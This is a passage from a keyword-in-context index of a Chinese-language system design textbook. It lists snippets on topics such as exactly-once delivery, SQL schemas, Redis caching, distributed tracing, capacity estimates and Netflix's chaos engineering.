  c02_b09.md: ...99.5% 的送达率（不是 100%）承认通知系统可能偶尔丢失事件。保证 100% 需要分布式系统中的 exactly-once 语义，代价很高（第 15 章）。那 0.5% 的 miss 率就是使用 at-least-once 配送加去重（ded...
  c02_b09.md: ...的 exactly-once 语义，代价很高（第 15 章）。那 0.5% 的 miss 率就是使用 at-least-once 配送加去重（deduplication），而不是更复杂的 exactly-once 方案的成本。  **Q2.** 你...
  c02_b09.md: ...ss 率就是使用 at-least-once 配送加去重（deduplication），而不是更复杂的 exactly-once 方案的成本。  **Q2.** 你正在设计一个银行转账系统。请把六个指标（latency、throughput、ava...
  c08_b02.md: ...渐消化积压。  **顺序：** 大多数队列大致按 FIFO（先进先出）顺序投递消息，但在故障下保证完全 exactly-once 顺序很难。   ### 8.3 投递保证——最多一次、至少一次、正好一次  考虑这个场景。邮件服务处理队列里一条“发送...
  c15_b03.md: ...至少一次投递——创造问题的保证  消息队列和任务队列提供不同的投递保证。最常见的是**至少一次投递（at-least-once delivery）**：每条消息都会投递给消费者至少一次，但可能投递多次。  为什么是“至少一次”而不是“恰好一次”？...
  c15_b03.md: ...一次，但可能投递多次。  为什么是“至少一次”而不是“恰好一次”？因为分布式系统中实现**恰好一次投递（exactly-once delivery）**本质上很难。  考虑：worker 收到任务，处理它，然后——就在向队列确认消息前——worke...
  c15_b03.md: ...）在分布式系统中不能作为原生原语实现。有些系统所谓“恰好一次”——例如 Kafka Streams 的 exactly-once 语义——是结合至少一次投递与幂等生产者和事务写来实现的，所以*效果*上像每条消息只处理一次。底层机制仍涉及重试和去重。...
  c25_b04.md: ...行程状态和司机状态。这与金融交易原则相同：通过 ACID 属性（第 5 章）的数据库事务或分布式锁实现 exactly-once 语义。  回忆第 4 章：强一致性以可用性为代价。网络分区期间，强一致的匹配服务可能无法处理新 ride reques...
  c25_b06.md: ...收取正确金额并准确支付给司机。这些都是金融交易事务（transaction）。  要求严格：  * **Exactly once：** 每张信用卡每笔行程只扣一次 * **Atomicity：** 对乘客扣款与给司机账户入账必须同时发生或都不发生...
  c25_b06.md: ...理器也不会重复扣款。这就是 **idempotency key（幂等性键）** 模式，在分布式系统中对 exactly-once 金融操作至关重要。  * * *...
  c25_b13.md: ...第 5 章 ACID 属性和 idempotency key（幂等性键）模式，确保在网络故障和重试下的 exactly-once 金融交易事务（transaction）。  与第 24 章对比：视频流容忍数分钟准备延迟并利用预计算（转码、CDN 预...

=== order (12 occurrences) ===
  c02_b10.md: ...除。从：       User → Payment Service → Notification Service → "Order confirmed"   改成异步模式：       User → Payment Service → (publis...
  c02_b10.md: ...nfirmed"   改成异步模式：       User → Payment Service → (publish "order placed" event to queue) → "Order confirmed"...
  c02_b10.md: ...ayment Service → (publish "order placed" event to queue) → "Order confirmed"                                    ↓ (asynchrono...
  c05_b02.md: ...s.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个...
  c05_b03.md: ...E 子句中频繁出现的列建索引** * **为外键列建索引**（如 `user_id`），让 join 更快 * **为 ORDER BY 用到的列建索引**，如果你经常对大结果集排序 * **不要过度索引**：每个索引都会拖慢写入。一张表上有 20...
  c05_b06.md: ...d     WHERE follows.follower_id = 1  -- Alice 的 user_id     ORDER BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `f...
  c05_b09.md: ...1. **这列是否频繁出现在生产查询的 WHERE、JOIN 或 ORDER BY 子句中？** 如果不是，索引代价（写入变慢）可能不值得。 2. **表是否足够大，以至于全表扫描明显慢？** 对...
  c05_b10.md: ...er_id = (SELECT id FROM users WHERE username = 'alice')     ORDER BY posts.created_at DESC     LIMIT 20;  有了 `idx_mentions_us...
  c05_b11.md: ...为什么慢。  提示  先识别实体（user、post）以及各自唯一标识符。对索引问题，想想数据库在没有索引的大表上满足 ORDER BY 子句时必须做什么——回顾 5.2 节全表扫描的讨论。  **答案：**  **Schema 设计：**...
  c05_b12.md: ..._urls, created_at     FROM posts     WHERE user_id = 42     ORDER BY created_at DESC     LIMIT 20;  **为什么需要索引：** 如果没有 `user_i...
  c05_b12.md: ...用户，平均每个用户只有约 1,000 行。数据库读 1000 万行来返回 1000 行——浪费比 10000:1。  `ORDER BY created_at DESC` 又增加第二个问题：即使过滤后，数据库也必须按时间戳排序匹配行，除非索引已经按顺...
  c12_b05.md: ...单至极的查询：       SELECT post_id, like_count     FROM posts     ORDER BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 s...

=== default (12 occurrences) ===
  c05_b06.md: ..._hash VARCHAR(255) NOT NULL,         follower_count INTEGER DEFAULT 0,         following_count INTEGER DEFAULT 0,         creat...
  c05_b06.md: ...er_count INTEGER DEFAULT 0,         following_count INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );...
  c05_b06.md: ...wing_count INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id...
  c05_b06.md: ...content     TEXT NOT NULL,         like_count  INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );...
  c05_b06.md: ...ike_count  INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE follows (         follow...
  c05_b06.md: ...users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (follower_id, followed_id)     )...
  c05_b06.md: ...posts(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (user_id, post_id)     );...
  c05_b10.md: ...users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (post_id, user_id)     );...
  c05_b11.md: ...avatar_url  VARCHAR(500),         joined_at   TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id...
  c05_b11.md: ...,         image_urls  TEXT[],         created_at  TIMESTAMP DEFAULT NOW()     );  **设计决策：**...
  c06_b11.md: ...VARCHAR(100) NOT NULL,         created_at  TIMESTAMP DEFAULT NOW()     );     CREATE INDEX idx_hashtags_tag ON hashtags(...
  c06_b12.md: ...GER REFERENCES users(id),         created_at      TIMESTAMP DEFAULT NOW(),         body            TEXT,         metadata...

=== update (12 occurrences) ===
  c05_b11.md: ...SERT INTO likes (user_id, post_id) VALUES (456, 12345);     UPDATE posts SET like_count = like_count + 1 WHERE id = 12345;...
  c05_b13.md: ...INTO follows (follower_id, followed_id) VALUES (1, 2);     UPDATE users SET follower_count = follower_count + 1 WHERE id = 2;...
  c05_b13.md: ...s SET follower_count = follower_count + 1 WHERE id = 2;     UPDATE users SET following_count = following_count + 1 WHERE id =...
  c05_b13.md: ...unt + 1 WHERE id = 1;     COMMIT;  如果事务中任何操作失败——包括 INSERT 和 UPDATE 之间崩溃——数据库会在重启时利用预写日志回滚所有更改。`follows` 表和计数器总是一起更新，要么都不更新。ACI...
  c07_b04.md: ...base     2. Invalidate (delete) the old cached value — OR — update it in the cache   让我们用 SocialSnap 走一遍。用户请求 Alice 的资料时：  **第...
  c09_b08.md: ...er 42's data     PATCH /users/42                  → partial update of user 42     DELETE /users/42/posts/101       → delete po...
  c12_b07.md: ...payments (user_id, amount, ...) VALUES (42, 9.99, ...);     UPDATE users SET is_premium = TRUE WHERE user_id = 42;     COMMIT;...
  c12_b11.md: ...用户名存在两个地方：users 表和每条 post 行。  **答案：** 伪代码：       1. UPDATE users SET username = 'new_name' WHERE user_id = 42;  // 在用户...
  c12_b11.md: ..._id = 42;  // 在用户所在 shard     2. 对每个 shard (0..7):          UPDATE posts SET author_username = 'new_name' WHERE user_id = 42;...
  c25_b06.md: ...行程记录，防止并发计费       SELECT * FROM trips WHERE trip_id = X FOR UPDATE;            -- 验证该行程尚未计费       IF trip.status = 'COMPLETED_...
  c25_b06.md: ...amount, type) VALUES (X, driver_payout, 'CREDIT');         UPDATE trips SET status = 'BILLED' WHERE trip_id = X;       END IF...
  c25_b06.md: ...'BILLED' WHERE trip_id = X;       END IF;     COMMIT;  `FOR UPDATE` 锁防止两个并发进程同时计费同一行程。状态检查实现幂等性（idempotency）：若计费被触发两次（如因网络超时导致...

=== cached (12 occurrences) ===
  c07_b04.md: ...e key in the cache     2. If cache HIT:        - Return the cached value     3. If cache MISS:        - Query the database for...
  c07_b04.md: ...ew value to the database     2. Invalidate (delete) the old cached value — OR — update it in the cache   让我们用 SocialSnap 走一遍。用...
  c07_b07.md: ...= f"user:{user_id}:profile"          # Check cache         cached = redis.get(cache_key)         if cached:             retur...
  c07_b07.md: ...heck cache         cached = redis.get(cache_key)         if cached:             return json.loads(cached)  # Cache hit...
  c11_b13.md: ..._id):         cache_key = f"user:{user_id}:profile"         cached = local_cache.get(cache_key)  # 进程内 Python dict（TTL 300 秒）...
  c11_b13.md: ...che.get(cache_key)  # 进程内 Python dict（TTL 300 秒）         if cached:             return cached         profile = db.query("SELE...
  c11_b13.md: ...ython dict（TTL 300 秒）         if cached:             return cached         profile = db.query("SELECT * FROM users WHERE id =...
  c11_b14.md: ..._id):         cache_key = f"user:{user_id}:profile"         cached = redis.get(cache_key)          # 共享 Redis，不是本地 dict...
  c11_b14.md: ...dis.get(cache_key)          # 共享 Redis，不是本地 dict         if cached:             return json.loads(cached)         profile = db...
  c11_b15.md: ...):         cache_key = f"presigned:{user_id}:photo"         cached = redis.get(cache_key)         if cached:             retur...
  c11_b15.md: ...id}:photo"         cached = redis.get(cache_key)         if cached:             return cached.decode()         url = object_st...
  c11_b15.md: ...redis.get(cache_key)         if cached:             return cached.decode()         url = object_storage.generate_presigned_ur...

=== trace (12 occurrences) ===
  c17_b06.md: ...中猎取，脑中重建时间线。  **分布式追踪（distributed tracing）** 通过在所有服务调用中传播 **trace ID** 来解决。   #### 定义：分布式追踪  **分布式追踪（distributed trace）** 是单次...
  c17_b06.md: ...用中传播 **trace ID** 来解决。   #### 定义：分布式追踪  **分布式追踪（distributed trace）** 是单次请求通过分布式系统的端到端旅程记录。它由 **spans** 组成——每个 span 是一个工作单元，带开...
  c17_b06.md: ...gether 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：       Trace ID: abc123       [0ms - 245ms]  API Gateway: handle GET /fe...
  c17_b06.md: ...中猎取，脑中重建时间线。  **分布式追踪（distributed tracing）** 通过在所有服务调用中传播 **trace ID** 来解决。   #### 定义：分布式追踪  **分布式追踪（distributed trace）** 是单次...
  c17_b06.md: ...用中传播 **trace ID** 来解决。   #### 定义：分布式追踪  **分布式追踪（distributed trace）** 是单次请求通过分布式系统的端到端旅程记录。它由 **spans** 组成——每个 span 是一个工作单元，带开...
  c17_b06.md: ...gether 跨越触碰请求的每个服务。  以下是 SocialSnap feed 请求追踪的文本形式示例：       Trace ID: abc123       [0ms - 245ms]  API Gateway: handle GET /fe...
  c17_b07.md: ...#### 追踪如何工作  当请求进入系统（在 API 网关或负载均衡器），生成一个 **trace ID**——通常是随机的 128 位 ID。这个 ID 附加到请求上（HTTP header：`X-Trace-ID:...
  c17_b07.md: ...个 **trace ID**——通常是随机的 128 位 ID。这个 ID 附加到请求上（HTTP header：`X-Trace-ID: abc123`）。  处理请求的每个服务读取这个 header，记录一个 span，并在所有下游调用中传播 t...
  c17_b07.md: ...e-ID: abc123`）。  处理请求的每个服务读取这个 header，记录一个 span，并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）、parent span ID、服务...
  c17_b07.md: ...求的每个服务读取这个 header，记录一个 span，并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）、parent span ID、服务名、操作名、开始时间戳、结束时间戳，以及...
  c17_b07.md: ...pans 被发送到一个集中式追踪后端（Jaeger、Zipkin、Honeycomb、Datadog APM），它通过 trace ID 拼接 span 树，重建追踪。工程师可以查询：“显示所有总时长超过 500ms 的追踪”或“显示请求 ID ab...
  c17_b12.md: ...）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目为：`INFO validate_jwt (5ms)`、`INFO fetch_user_from_d...

=== reactions (12 occurrences) ===
  c18_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想部署新功能“Reactions”（用户可以用 emoji 对帖子反应，而不仅是点赞）。这需要数据库迁移（添加 `reactions` 表和 posts...
  c18_b12.md: ...段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1 周）：**  * 部署迁移：添加 `reactions` 表（id, post_id, user_id, reaction_type, created_at）和 posts...
  c18_b12.md: ...阶段 2——后端部署，功能开关关闭（第 1 周）：**  * 部署新 API 端点 `POST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Service 变更，在功能开关开启时响应中包括...
  c18_b12.md: ...* 部署 Feed Service 变更，在功能开关开启时响应中包括 `reaction_count`。 * 功能开关“reactions”默认关闭。 * 运行数天，确认新代码路径没有意外错误。  **阶段 3——内部测试（第 2 周）：**  * 仅对内部...
  c18_b12.md: ...0% → 100%。  **回滚计划：**  * 触发条件：reaction API 错误率 5 分钟 > 1%，或 `reactions` 表迁移出现任何错误。 * 动作：对所有用户禁用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停...
  c18_b12.md: ...用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停止显示 reaction 计数。 * 数据库：`reactions` 表和 `reaction_count` 列保留——不影响现有功能。如果功能取消，可在未来单独迁移删除它们。 * 验证...
  c18_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想部署新功能“Reactions”（用户可以用 emoji 对帖子反应，而不仅是点赞）。这需要数据库迁移（添加 `reactions` 表和 posts...
  c18_b12.md: ...段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1 周）：**  * 部署迁移：添加 `reactions` 表（id, post_id, user_id, reaction_type, created_at）和 posts...
  c18_b12.md: ...阶段 2——后端部署，功能开关关闭（第 1 周）：**  * 部署新 API 端点 `POST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Service 变更，在功能开关开启时响应中包括...
  c18_b12.md: ...* 部署 Feed Service 变更，在功能开关开启时响应中包括 `reaction_count`。 * 功能开关“reactions”默认关闭。 * 运行数天，确认新代码路径没有意外错误。  **阶段 3——内部测试（第 2 周）：**  * 仅对内部...
  c18_b12.md: ...0% → 100%。  **回滚计划：**  * 触发条件：reaction API 错误率 5 分钟 > 1%，或 `reactions` 表迁移出现任何错误。 * 动作：对所有用户禁用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停...
  c18_b12.md: ...用功能开关（即时，无需部署）。新 API 端点返回 404。Feed 停止显示 reaction 计数。 * 数据库：`reactions` 表和 `reaction_count` 列保留——不影响现有功能。如果功能取消，可在未来单独迁移删除它们。 * 验证...

=== hdd (11 occurrences) ===
  c03_b01.md: ...s | SSD 快，但不如 RAM | | 从 SSD 顺序读 1MB | 1 ms | 顺序读取远快于随机读 | | HDD 寻道 + 读取 | 10 ms | HDD 寻道主导其延迟 | | 同一数据中心内数据包往返 | 0.5 ms | 数...
  c03_b01.md: ...从 SSD 顺序读 1MB | 1 ms | 顺序读取远快于随机读 | | HDD 寻道 + 读取 | 10 ms | HDD 寻道主导其延迟 | | 同一数据中心内数据包往返 | 0.5 ms | 数据中心内网络很快 | | 跨洲数据包往返 |...
  c03_b01.md: ...| 0.5 ms | 数据中心内网络很快 | | 跨洲数据包往返 | 150 ms | 物理限制了跨洲速度 | | 从 HDD 顺序读 1MB | 20 ms | HDD 顺序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM...
  c03_b01.md: ...| 跨洲数据包往返 | 150 ms | 物理限制了跨洲速度 | | 从 HDD 顺序读 1MB | 20 ms | HDD 顺序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM 比 SSD 快 100 倍。SSD 随机读...
  c03_b01.md: ...序读比 SSD 慢约 20 倍 |  花点时间感受这些数字的量级。RAM 比 SSD 快 100 倍。SSD 随机读比 HDD 快 100 倍。跨洲网络往返比同一数据中心往返慢 300 倍。  这些比例在硬件代际间保持稳定（绝对值会改进，但相互比...
  c03_b06.md: ...用户同时加载的明星主页）是反模式。  **答案：** 假设明星主页存在 PostgreSQL 数据库的机械硬盘上。从 HDD 读取需要约 10 ms 的寻道 + 读取。如果 10,000 用户同时想看这个主页，而数据库每秒只能处理 1000 个...
  c03_b10.md: ...策。  工具：  * **延迟数字：** 知道 L1 缓存（1 ns）、RAM（100 ns）、SSD（150 μs）、HDD（10 ms）和网络（0.5–150 ms）的数量级。这些是你这个世界的速度极限。 * **2 和 10 的幂：** 你...
  c10_b02.md: ...0.10 USD/GB * 容量：每块磁盘 TB * 存放内容：对延迟不那么敏感的数据库存储、温存储  **第 5 级：HDD（机械硬盘）**  * 速度：约 10 毫秒（随机访问——磁盘必须物理寻道） * 成本：约 0.02–0.05 USD/...
  c10_b02.md: ...10,000 倍差距  需要记住的一个数字：DRAM 访问与 SSD 访问的差距约为 1,000 倍。DRAM 访问与 HDD 访问的差距约为 100,000 倍。Redis 以微秒级服务数据；PostgreSQL 在机械盘上需要几十毫秒。存储层...
  c10_b02.md: ...）移到第 2 级（DRAM，通过 Redis），访问延迟可降低 100,000 倍。  但 DRAM 每 GB 成本比 HDD 高 100–500 倍。你不能把所有东西存在 DRAM 中——必须选择哪些数据值得这个溢价。...
  c28_b11.md: ...A | 保护服务可用性 | 中 **Block storage (SSD/HDD)** (Ch 10) | SSD 低，HDD 中 | 持久 | 中 | 低 **Object storage (S3)** (Ch 10) | 中（网络往返） |...

=== dau (11 occurrences) ===
  c03_b02.md: ...户（DAU, Daily Active Users）：** 假设 MAU 中 50% 在任何一天活跃 → 150 百万 DAU（1.5 亿） * **每个用户每天平均请求数：** 典型用户一天打开应用约 5 次，每次加载 Feed（1 次请求）、...
  c03_b03.md: ...载——而不是 1 亿用户系统的负载。注册用户数出现在新闻稿里；日活用户数出现在架构文档里。估算 QPS 前总要先换算成 DAU，因为沉睡用户产生零请求。同样，工程师有时会估算“平均”QPS 并按这个数设计，却忘了峰值负载（系统必须承受的流量尖峰）...
  c03_b07.md: ...blob 存储方案（如 S3），而不是数据库存储。  **(b) 视频服务带宽：** 从 3.5 节可知，500 万 DAU 的 SocialSnap 大致有：  * Feed 加载：5M × 5/天 = 25M/天（2500 万/天）= 28...
  c03_b08.md: ...50 百万（5000 万）日活用户。每个用户平均每天流式播放 45 分钟音频，码率 128 kbps。此外，1% 的 DAU 每天上传一首新的 4 分钟曲目，编码为 320 kbps。  估算：  * **(a)** 音频流式请求的平均 QPS...
  c03_b08.md: ...传曲目每天需要的存储  展示所有单位换算。  **答案：**  **(a) 流式请求平均 QPS：**  5000 万 DAU 每人每天启动一次流式会话（简化假设——现实中用户可能多次启停）。  每天流式会话数 = 50,000,000 每天秒数...
  c03_b10.md: ...速度极限。 * **2 和 10 的幂：** 你用来度量存储和吞吐的计数系统。 * **QPS 估算：** 从用户 → DAU → 每用户每天动作数 → 每秒请求数 → 峰值乘数。 * **存储估算：** 从每用户数据量 → 用户数 → 时间跨度...
  c21_b14.md: ....**（联系第 3 章估算方法）SocialSnap 的 DM 功能上线，50 万（500,000）日活用户。假设每名 DAU 平均每天发 8 条消息、每收到一条消息收到一次推送通知（平均每天收到 6 条）。估算 (a) 数据库消息写入和 (b)...
  c21_b14.md: ...瓶颈问题需考虑每个组件每条消息要做什么及其吞吐上限。  **答案：**  **(a) 消息写入：**  500,000 DAU × 8 条消息/天 = 4,000,000 次写入/天  平均 QPS = 4,000,000 / 86,400 ≈...
  c21_b14.md: ...1,000–5,000 TPS）范围内。数据库写入不是该规模瓶颈。  **(b) 推送通知投递：**  500,000 DAU × 6 条收到消息/天 = 3,000,000 次推送/天  平均 QPS = 3,000,000 / 86,400...
  c21_b14.md: ...0/秒对任何推送服务来说都非常低，不是扩展问题。  **(c) WebSocket 连接服务器：**  500,000 DAU，典型移动会话每天 20–30 分钟，会话分布在清醒时段（约 16 小时）。峰值晚间并发活跃用户：约占 DAU 10–1...
  c21_b14.md: ...,000 DAU，典型移动会话每天 20–30 分钟，会话分布在清醒时段（约 16 小时）。峰值晚间并发活跃用户：约占 DAU 10–15% = **5 万–7.5 万（50,000–75,000）个同时 WebSocket 连接**。...

=== gbps (11 occurrences) ===
  c03_b04.md: ...B（含文字和缩略图的 Feed 页） * 带宽：50,000 请求/秒 × 50 KB = 2.5 GB/s = 20 Gbps  一台典型服务器的网卡是 1–10 Gbps。这意味着仅处理网络带宽就需要至少 2–20 台服务器，还没考虑 CPU...
  c03_b04.md: ...：50,000 请求/秒 × 50 KB = 2.5 GB/s = 20 Gbps  一台典型服务器的网卡是 1–10 Gbps。这意味着仅处理网络带宽就需要至少 2–20 台服务器，还没考虑 CPU 负载。  **写带宽（接收用户上传的数据）：*...
  c03_b04.md: ...bps（1080p HD） 4. 总带宽需求：2300 万 × 5 Mbps = 115 Tbps 5. 一台带 40 Gbps 网络链路的 CDN 服务器可服务：40,000 Mbps / 5 Mbps = 8000 路流 6. CDN 服务器数...
  c03_b07.md: ...存储；(b) 服务视频内容需要额外多少带宽（假设 20% 的 Feed 加载包含一个自动播放视频）；(c) 一条 10 Gbps 网络连接能否处理。  提示  这与 3.5 节方法相同。先算每天视频数，再分别算存储和带宽。带宽方面，记住视频是持续流...
  c03_b08.md: ...× 20% = 174 个并发视频流 * 视频带宽：174 × 2 Mbps = **348 Mbps ≈ 0.35 Gbps** * 含文字/图片的总带宽：再加约 20 MB/s = 0.16 Gbps * **总峰值带宽：约 0.5 Gbps...
  c03_b08.md: ...= **348 Mbps ≈ 0.35 Gbps** * 含文字/图片的总带宽：再加约 20 MB/s = 0.16 Gbps * **总峰值带宽：约 0.5 Gbps**  **(c) 单条 10 Gbps 连接是否足够：** 0.5 Gbps...
  c03_b08.md: ...Gbps** * 含文字/图片的总带宽：再加约 20 MB/s = 0.16 Gbps * **总峰值带宽：约 0.5 Gbps**  **(c) 单条 10 Gbps 连接是否足够：** 0.5 Gbps 远低于单条 10 Gbps 连接——只用...
  c03_b08.md: ...再加约 20 MB/s = 0.16 Gbps * **总峰值带宽：约 0.5 Gbps**  **(c) 单条 10 Gbps 连接是否足够：** 0.5 Gbps 远低于单条 10 Gbps 连接——只用了 5%。但这假设了最优服务（CDN、缓...
  c03_b08.md: ...Gbps * **总峰值带宽：约 0.5 Gbps**  **(c) 单条 10 Gbps 连接是否足够：** 0.5 Gbps 远低于单条 10 Gbps 连接——只用了 5%。但这假设了最优服务（CDN、缓存）。如果每个视频请求都直接打到源服务...
  c03_b08.md: ...：约 0.5 Gbps**  **(c) 单条 10 Gbps 连接是否足够：** 0.5 Gbps 远低于单条 10 Gbps 连接——只用了 5%。但这假设了最优服务（CDN、缓存）。如果每个视频请求都直接打到源服务器且没有 CDN，每个视频以...
  c03_b08.md: ...直接打到源服务器且没有 CDN，每个视频以完整 5 MB 流式传输，计算会显著不同。如果有 CDN 吸收视频流量，10 Gbps 连接在这个规模下足够。没有 CDN 的话，一条病毒式传播的视频几分钟内几百万次观看就会立刻饱和单条连接。  **架构结...

=== netflix (11 occurrences) ===
  c03_b04.md: ...之间。费米法从几乎 nothing 开始，误差在 2 倍以内。  **把费米估算应用到系统设计：**  **例子：** Netflix 需要多少服务器来处理视频流？  1. Netflix 全球约 2.3 亿订阅用户 2. 假设峰值同时观看比例为 10%...
  c03_b04.md: ...倍以内。  **把费米估算应用到系统设计：**  **例子：** Netflix 需要多少服务器来处理视频流？  1. Netflix 全球约 2.3 亿订阅用户 2. 假设峰值同时观看比例为 10%：2300 万并发流 3. 平均视频码率：约 5 Mb...
  c03_b04.md: ...0 路流 6. CDN 服务器数量：2300 万 / 8000 = 2875 → 向上取整约 3000 台活跃服务器  Netflix 实际使用一个名为 Open Connect 的自定义 CDN，在 ISP 中部署了数千台服务器。这个估算得到了正确的数...
  c04_b08.md: ...变成 300ms，用户也会注意到（并离开）。 3. **许多真实系统对延迟敏感。** Google、Amazon 和 Netflix 都写过，页面加载时间增加 100ms 会显著降低用户参与度。对这些公司来说，ELC tradeoff（为一致性支付延迟...
  c16_b10.md: ...程（chaos engineering）**：故意向生产系统引入故障，以验证系统正确响应以及团队的事故响应流程有效。  Netflix 用 **Chaos Monkey** 推广了混沌工程——一个随机终止生产实例的服务。目标：如果服务器随时可能挂，团队必...
  c16_b17.md: ...#### 深入思考  **Q1.** Netflix 的混沌工程包括故意 kill 生产服务器。一位 CTO 反对：“这太疯狂了——为什么我们要故意破坏自己的生产系统？我们...
  c16_b17.md: ...置错误、过时的假设、staging 环境无法揭示的边界情况，意味着故障转移机制的第一次“真实”测试就是失控生产失败。  Netflix 的发现：Chaos Monkey 刚部署时，经常揭示团队原以为已正确处理的失败。健康检查不工作。理论上可故障转移实际不...
  c16_b17.md: ...理论上可故障转移实际不可行。依赖项未被正确熔断。每次发现都在受控环境中修复。每次修复都让系统更有弹性。经过多年混沌工程，Netflix 的可用性提高了——因为他们在客户体验到脆弱性之前发现并修复了它们。  混沌工程的受控本质正是其安全之处：实验在工作时间...
  c18_b04.md: ...#### Chaos Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在 AWS 上，他们观察到 EC2 实例有...
  c18_b04.md: ...#### Chaos Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在 AWS 上，他们观察到 EC2 实例有时会意外失败。与其构建旨在防止实例失败的架构（不可能完全实现），不如构建...
  c18_b14.md: ...综合：混沌工程不是“故意制造 outage”。做好时，它是“故意引入特定、有界、被监控的失败，以验证系统按设计处理它。”Netflix Chaos Monkey 并非无观察地随机 kill 生产服务器——它是在工作时间、工程师盯着、自动监控和回滚流程就绪...

=== now (11 occurrences) ===
  c05_b06.md: ...nt INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id...
  c05_b06.md: ...t  INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE follows (         follower_i...
  c05_b06.md: ...d) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (follower_id, followed_id)     );...
  c05_b06.md: ...d) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (user_id, post_id)     );          -...
  c05_b10.md: ...d) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (post_id, user_id)     );          -...
  c05_b11.md: ...ar_url  VARCHAR(500),         joined_at   TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id...
  c05_b11.md: ...image_urls  TEXT[],         created_at  TIMESTAMP DEFAULT NOW()     );  **设计决策：**...
  c06_b11.md: ...ARCHAR(100) NOT NULL,         created_at  TIMESTAMP DEFAULT NOW()     );     CREATE INDEX idx_hashtags_tag ON hashtags(tag)...
  c06_b11.md: ...COUNT(*) as count     FROM hashtags     WHERE created_at > NOW() - INTERVAL '24 hours'     GROUP BY tag     ORDER BY count...
  c06_b12.md: ...RENCES users(id),         created_at      TIMESTAMP DEFAULT NOW(),         body            TEXT,         metadata        JS...
  c11_b04.md: ...= {"user_id": user_id, "username": username, "created_at": now()}          redis.setex(             f"session:{session_id}...

=== varchar (11 occurrences) ===
  c05_b06.md: ...id          SERIAL PRIMARY KEY,         username    VARCHAR(50) UNIQUE NOT NULL,         email       VARCHAR(255) UNIQU...
  c05_b06.md: ...sername    VARCHAR(50) UNIQUE NOT NULL,         email       VARCHAR(255) UNIQUE NOT NULL,         password_hash VARCHAR(255) NO...
  c05_b06.md: ...l       VARCHAR(255) UNIQUE NOT NULL,         password_hash VARCHAR(255) NOT NULL,         follower_count INTEGER DEFAULT 0,...
  c05_b11.md: ...id          SERIAL PRIMARY KEY,         name        VARCHAR(100) NOT NULL,         bio         TEXT,         avatar_url...
  c05_b11.md: ...00) NOT NULL,         bio         TEXT,         avatar_url  VARCHAR(500),         joined_at   TIMESTAMP DEFAULT NOW()     );...
  c06_b12.md: ...id              SERIAL PRIMARY KEY,         name            VARCHAR(200) NOT NULL,         dob             DATE NOT NULL,...
  c06_b12.md: ...dob             DATE NOT NULL,         insurance_id    VARCHAR(100)     );      CREATE TABLE medications (         id...
  c06_b12.md: ...INTEGER REFERENCES patients(id),         drug_name       VARCHAR(200) NOT NULL,         dosage          VARCHAR(100),...
  c06_b12.md: ...g_name       VARCHAR(200) NOT NULL,         dosage          VARCHAR(100),         frequency       VARCHAR(100),         started...
  c06_b12.md: ...dosage          VARCHAR(100),         frequency       VARCHAR(100),         started_on      DATE NOT NULL,         ended_...
  c06_b12.md: ...INTEGER REFERENCES patients(id),         note_type       VARCHAR(50),         author_id       INTEGER REFERENCES users(id),...

=== query (11 occurrences) ===
  c07_b07.md: ...urn json.loads(cached)  # Cache hit          # Cache miss — query database         profile = db.query("SELECT * FROM users WH...
  c07_b07.md: ...# Cache miss — query database         profile = db.query("SELECT * FROM users WHERE id = %s", [user_id])          #...
  c08_b11.md: ...we already sent the welcome email         already_sent = db.query(             "SELECT 1 FROM sent_emails WHERE user_id = %s...
  c09_b08.md: ...解决 REST 的过度取回和取回不足问题。  在 GraphQL 中，客户端在查询中精确指定想要什么数据：       query {       user(id: 42) {         username         photoUrl...
  c09_b08.md: ...：**  * 服务器实现更复杂（需要 schema、每个字段的 resolver） * 缓存更难——因为查询是带自定义 query body 的 POST 请求，HTTP 层缓存不适用；缓存必须在应用层做 * 过于灵活的查询可能成为安全问题（客户端可...
  c09_b14.md: ...00-400ms；即使并行也需要约 100-150ms。GraphQL 会把这 4 个调用合并成一个查询：       query HomeFeed {       me {         username         photoUrl...
